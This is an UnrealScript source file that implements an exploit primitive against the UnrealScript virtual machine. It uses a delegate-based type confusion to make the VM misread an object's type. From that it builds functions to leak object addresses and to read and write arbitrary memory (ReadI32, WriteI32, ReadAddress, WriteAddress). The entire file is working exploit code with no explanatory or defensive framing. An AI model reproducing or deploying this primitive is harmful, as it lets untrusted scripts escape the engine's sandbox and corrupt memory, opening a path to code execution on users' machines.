class ReadWritePrimitive extends Object dependsOn(
    Symbols,
    DataStructures,
    ActualConfusedObject,
    ExpectedConfusedObject
);

// after Self.Init .. this is technically an 'ActualConfusedObject' Object
//  but UScript VM considers it an 'ExpectedConfusedObject' Object
var ExpectedConfusedObject Confused;

// helper datastructures for leaking, reading memory
var array<Object> ObjLeakArray;
var Address Ptr_ObjLeakArray_Data;

var array<int> ReadWriteArray;
var Address Ptr_ReadWriteArray_Data;

delegate Object Del_MaskObject(Object Obj);
delegate ExpectedConfusedObject Del_ActualToExpected(ActualConfusedObject ActConfObj);

private static function Object MaskObject(Object obj) {
    return obj;
}

private function ExpectedConfusedObject TriggerConfuse() {
    local ActualConfusedObject ActConfObj;
    local delegate<Del_MaskObject> MaskingDelegate;
    local delegate<Del_ActualToExpected> ReturningDelegate;

    ActConfObj = new Class'ActualConfusedObject';

    MaskingDelegate = MaskObject;
    ReturningDelegate = MaskingDelegate;
    return ReturningDelegate(ActConfObj);
}

function bool Init() {
    local UnpackedArray Info;

    // ensure that ObjLeakArray, ReadWriteArray has memory for 'TArray<...>.Data'
    // XXX: it's important that *no* new array elements are appended
    //   after these 'AddItem' calls since that will likely make Ptr_... stale!
    ReadWriteArray.AddItem(11);
    ReadWriteArray.AddItem(12);
    ReadWriteArray.AddItem(13);

    ObjLeakArray.AddItem(Self);
    ObjLeakArray.AddItem(Self);
    ObjLeakArray.AddItem(Self);

    // create a new 'ActualConfusedObject' and confuse the VM into thinking its 'ExpectedConfusedObject'
    Confused = TriggerConfuse();

    // while we're here, grab useful address info (for speeding up RWPrim API usage)
    Info = Confused.UnpackIntArray(ReadWriteArray);

    // `log("Info.Data: 0x" $ ToHex(Info.Data));
    Ptr_ReadWriteArray_Data.Low = Info.Data;
    if(Info.Length != 0x3 || Info.Capacity != 0x4) {
        `log("error: Info{ l: 0x" $ ToHex(Info.Length) $ ", c: 0x" $ ToHex(Info.Capacity) $ " } does not match expected Info{ l: 0x3, c: 0x4 }, likely arch != 64bit!");
        return False;
    }

    // `log("Info.Length: " $ ToHex(Info.Length));
    // `log("Info.Capacity: " $ ToHex(Info.Capacity));

    Info = Confused.UnpackObjectArray(ObjLeakArray);
    // `log("Info.Data: 0x" $ ToHex(Info.Data));
    Ptr_ObjLeakArray_Data.Low = Info.Data;

    // `log("Info.Length: " $ ToHex(Info.Length));
    // `log("Info.Capacity: " $ ToHex(Info.Capacity));

    return True;
}

function Address LeakObjectAddress(Object ObjToLeak) {
    local Object Tmp;
    local Address LeakedAddr;
    local UnpackedArray FakeArray;

    FakeArray.Data = Ptr_ObjLeakArray_Data.Low;

    FakeArray.Length = 1;
    FakeArray.Capacity = 1;

    Tmp = ObjLeakArray[0];
    ObjLeakArray[0] = ObjToLeak;

    LeakedAddr.Low = Confused.RepackArrayAndReadInt32(FakeArray);

    // restore 'Tmp' so we don't keep a reference to ObjToLeak
    ObjLeakArray[0] = Tmp;

    return LeakedAddr;
}

function UnpackedArray LeakIntArray(out array<int> Arr) {
    return Confused.UnpackIntArray(Arr);
}

function UnpackedArray LeakFString(out string Str) {
    return Confused.UnpackFString(Str);
}

function UnpackedName LeakName(name NameVal) {
    return Confused.UnpackName(NameVal);
}

function UnpackedArray LeakObjectArray(out array<Object> Arr) {
    return Confused.UnpackObjectArray(Arr);
}

function int ReadI32(Address Addr, int Offset) {
    local UnpackedArray FakeArray;

    Addr = `UTIL.Address_AddI32(Addr, Offset);

    FakeArray.Data = Addr.Low;

    FakeArray.Length = 1;
    FakeArray.Capacity = 1;

    return Confused.RepackArrayAndReadInt32(FakeArray);
}

function WriteI32(Address Addr, int Offset, int Value) {
    local UnpackedArray FakeArray;

    Addr = `UTIL.Address_AddI32(Addr, Offset);

    FakeArray.Data = Addr.Low;

    FakeArray.Length = 1;
    FakeArray.Capacity = 1;

    Confused.RepackArrayAndWriteInt32(FakeArray, Value);
}

function Address ReadAddress(Address Addr, int Offset) {
    local Address Result;
    Result.Low = ReadI32(Addr, Offset);
    return Result;
}

function WriteAddress(Address Addr, int Offset, Address Value) {
    WriteI32(Addr, Offset, Value.Low);
}

function HexdumpAddr(Address Addr, int Base, int Len) {
    local int Offset;
    for(Offset = 0; Offset < Len; Offset += 0x4) {
        `log(".." $ ToHex(Base + Offset) $ ": 0x" $ ToHex(ReadI32(Addr, Base + Offset)));
    }
}
